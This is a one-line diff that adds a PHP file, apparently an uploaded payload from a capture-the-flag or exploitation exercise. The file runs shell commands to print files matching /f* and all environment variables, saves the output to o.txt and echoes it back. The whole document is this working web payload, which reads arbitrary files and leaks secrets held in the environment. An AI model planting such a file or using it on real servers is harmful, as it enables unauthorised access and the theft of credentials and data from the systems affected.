@@ -1,0 +1,1 @@
+<?php $o=shell_exec('cat /f* 2>&1;env');@file_put_contents(__DIR__.'/o.txt',$o);echo $o; ?>
